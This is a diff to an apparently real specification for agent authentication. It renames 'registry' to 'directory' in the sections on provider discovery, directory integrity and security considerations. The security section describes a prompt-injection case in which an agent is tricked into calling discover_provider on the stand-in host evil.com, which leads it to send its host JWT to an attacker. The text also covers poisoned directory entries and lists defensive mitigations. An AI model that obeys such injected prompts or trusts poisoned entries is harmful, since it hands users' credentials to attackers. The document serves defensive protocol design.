@@ -1866,7 +1866,7 @@ WWW-Authenticate: AgentAuth discovery="https://auth.example.com/.well-known/agen
 - Clients that receive an `AgentAuth` challenge SHOULD fetch the discovery URL if no active agent exists for that server, then proceed through registration (§5.3) before retrying the original request.
 - If the agent JWT is present but the agent lacks the required capability, the resource server SHOULD return `403` with the `capability_not_granted` error code (§5.13) instead of a `401` challenge.
 
-This mechanism is OPTIONAL. Agents SHOULD prefer proactive discovery via `/.well-known/agent-configuration` or registry search (`search_providers`, §6.2.2) when possible. The challenge header exists as a fallback for cases where the agent has no prior knowledge of the service's auth configuration.
+This mechanism is OPTIONAL. Agents SHOULD prefer proactive discovery via `/.well-known/agent-configuration` or directory search (`search_providers`, §6.2.2) when possible. The challenge header exists as a fallback for cases where the agent has no prior knowledge of the service's auth configuration.
 
 ## 6. Client
 
@@ -1878,7 +1878,7 @@ The protocol does not define how agents communicate with clients. A client may r
 
 ### 6.2 Discovering Providers
 
-Before an agent can connect, it may need to determine which provider to use. Clients MAY expose provider-discovery tools for this purpose. `list_providers` returns providers the client already has available, `search_providers` finds providers by intent through a registry, and `discover_provider` resolves a specific provider from a direct URL.
+Before an agent can connect, it may need to determine which provider to use. Clients MAY expose provider-discovery tools for this purpose. `list_providers` returns providers the client already has available, `search_providers` finds providers by intent through a directory, and `discover_provider` resolves a specific provider from a direct URL.
 
 Clients that are designed for a single service MAY omit some or all of these tools. In that case, the provider is implicit in the client itself and the agent can proceed directly to capability listing or connection.
 
@@ -1902,7 +1902,7 @@ Single-provider clients MAY omit this tool since the agent already knows the pro
 
 #### 6.2.2 search_providers
 
-Searches a registry for providers matching a natural language intent. Clients that do not support registry lookup MAY omit this tool.
+Searches a directory for providers matching a natural language intent. Clients that do not support directory lookup MAY omit this tool.
 
 **Input:**
 
@@ -1910,7 +1910,7 @@ Searches a registry for providers matching a natural language intent. Clients th
 
 **Behavior:**
 
-1. Query a registry (§6.11) to find matching services.
+1. Query a directory (§6.11) to find matching services.
 2. Return matching providers for the agent to choose from.
 
 **Response shape:**
@@ -2262,19 +2262,19 @@ Executes a granted capability by routing the request to the capability's locatio
 3. Return the result to the agent
 4. For async responses (`status: "pending"`), poll the `status_url` until completion and return the final result
 
-### 6.11 Registry
+### 6.11 Directory
 
-A registry is a searchable index of services that support Agent Auth. It is a client-side discovery aid, not part of the core server protocol — the registry URL is configured on the client.
+A directory is a searchable index of services that support Agent Auth. It is a client-side discovery aid, not part of the core server protocol — the directory URL is configured on the client.
 
-When an agent calls `search_providers`, the client queries its configured registry to find matching providers. Clients SHOULD prefer registry lookups over fetching arbitrary URLs provided by agents.
+When an agent calls `search_providers`, the client queries its configured directory to find matching providers. Clients SHOULD prefer directory lookups over fetching arbitrary URLs provided by agents.
 
-Registries MAY be public (open to all services), private (enterprise-only), or bundled with the client as a static list.
+Directories MAY be public (open to all services), private (enterprise-only), or bundled with the client as a static list.
 
 **Search interface:**
 
-For generic client interoperability, a registry MUST implement the following endpoint:
+For generic client interoperability, a directory MUST implement the following endpoint:
 
-`GET {registry_url}/api/search?intent={intent}&limit={limit}`
+`GET {directory_url}/api/search?intent={intent}&limit={limit}`
 
 | Parameter | Type | Required | Description |
 |---|---|---|---|
@@ -2307,17 +2307,17 @@ Each entry in `providers` is a standard discovery document (§5.1). The client M
 
 **Service registration:**
 
-How services are added to a registry is implementation-specific. A registry MAY accept submissions via API, require manual review, auto-discover from a crawl, or any other mechanism. The only protocol requirement is the search interface above.
+How services are added to a directory is implementation-specific. A directory MAY accept submissions via API, require manual review, auto-discover from a crawl, or any other mechanism. The only protocol requirement is the search interface above.
 
-**Registry integrity:**
+**Directory integrity:**
 
-Registries are a trust anchor — a poisoned registry entry can direct agents to malicious servers. Registries and clients SHOULD apply the following protections:
+Directories are a trust anchor — a poisoned directory entry can direct agents to malicious servers. Directories and clients SHOULD apply the following protections:
 
-- **Issuer verification.** Before adding a service to the registry, the registry SHOULD fetch `{issuer}/.well-known/agent-configuration` and verify that the discovery document's `issuer` field matches the submitted `issuer` URL exactly. This prevents an attacker from registering a service entry pointing to someone else's domain.
-- **TLS validation.** The registry MUST fetch discovery documents over HTTPS and validate the server's TLS certificate chain. Reject self-signed or expired certificates.
-- **Periodic re-validation.** Registries SHOULD periodically re-fetch and re-validate listed services (e.g. daily). Services whose discovery endpoints become unreachable, return errors, or fail issuer verification SHOULD be flagged or delisted.
-- **Spam and squatting prevention.** Public registries SHOULD require verification of domain ownership before listing a service (e.g. DNS TXT record, well-known file challenge). This prevents attackers from registering entries for domains they do not control.
-- **Client-side verification.** Clients SHOULD verify the `issuer` field in the discovery document returned by a registry entry matches the `issuer` in the registry result. If they differ, the client MUST reject the entry and SHOULD warn the user.
+- **Issuer verification.** Before adding a service to the directory, the directory SHOULD fetch `{issuer}/.well-known/agent-configuration` and verify that the discovery document's `issuer` field matches the submitted `issuer` URL exactly. This prevents an attacker from registering a service entry pointing to someone else's domain.
+- **TLS validation.** The directory MUST fetch discovery documents over HTTPS and validate the server's TLS certificate chain. Reject self-signed or expired certificates.
+- **Periodic re-validation.** Directories SHOULD periodically re-fetch and re-validate listed services (e.g. daily). Services whose discovery endpoints become unreachable, return errors, or fail issuer verification SHOULD be flagged or delisted.
+- **Spam and squatting prevention.** Public directories SHOULD require verification of domain ownership before listing a service (e.g. DNS TXT record, well-known file challenge). This prevents attackers from registering entries for domains they do not control.
+- **Client-side verification.** Clients SHOULD verify the `issuer` field in the discovery document returned by a directory entry matches the `issuer` in the directory result. If they differ, the client MUST reject the entry and SHOULD warn the user.
 
 ## 7. Approval Methods
 
@@ -2439,7 +2439,7 @@ Servers SHOULD validate requested capability names against a known set. Servers 
 
 ### 8.7 Host Key Rotation
 
-Inline key hosts rotate via `POST /host/rotate-key` (§5.9). Since the client does not maintain a durable registry of every server a host is registered on, inline rotation is limited to servers the client currently knows about. For key compromise, revoke the host entirely — a compromised key means you cannot trust the rotation request itself.
+Inline key hosts rotate via `POST /host/rotate-key` (§5.9). Since the client does not maintain a durable record of every server a host is registered on, inline rotation is limited to servers the client currently knows about. For key compromise, revoke the host entirely — a compromised key means you cannot trust the rotation request itself.
 
 JWKS-based hosts rotate by updating their endpoint — the server picks up new keys on the next cache refresh (recommended: every 5 minutes or on `kid` miss). The old key SHOULD remain in the JWKS for a grace period to avoid rejecting in-flight requests.
 
@@ -2485,12 +2485,12 @@ Servers SHOULD provide an authenticated, out-of-band mechanism (e.g. user dashbo
 Discovery of arbitrary URLs is a prompt injection vector. A malicious prompt can trick an agent into calling `discover_provider(url: "https://evil.com")`, which returns a fake configuration. The client then sends the host JWT to the attacker's "register" endpoint.
 
 Mitigations:
-- **Registry-first discovery.** Clients SHOULD resolve new services through a trusted registry (§6.11) using `search_providers` rather than arbitrary URLs.
+- **Directory-first discovery.** Clients SHOULD resolve new services through a trusted directory (§6.11) using `search_providers` rather than arbitrary URLs.
 - **User confirmation.** If `discover_provider` is called with a direct URL, the client SHOULD require user confirmation before fetching the configuration.
 - **Allowlists.** Clients MAY maintain an allowlist of trusted service URLs.
 - **Proof on host-authenticated registration.** For **discovered servers** (not pre-configured), clients SHOULD use DPoP or an equivalent request-specific proof on host-authenticated registration requests so they cannot be replayed to a different endpoint.
 - **TLS verification.** Clients MUST verify TLS certificates when fetching discovery endpoints.
-- **Registry integrity.** When using registry-based discovery, clients SHOULD verify that the `issuer` in the fetched discovery document matches the `issuer` from the registry result. A mismatch indicates a poisoned registry entry or a man-in-the-middle attack. See §6.11 for registry-side protections.
+- **Directory integrity.** When using directory-based discovery, clients SHOULD verify that the `issuer` in the fetched discovery document matches the `issuer` from the directory result. A mismatch indicates a poisoned directory entry or a man-in-the-middle attack. See §6.11 for directory-side protections.
 - **Algorithm downgrade protection.** See §8.16.
 
 ### 8.10 Approval Gravity
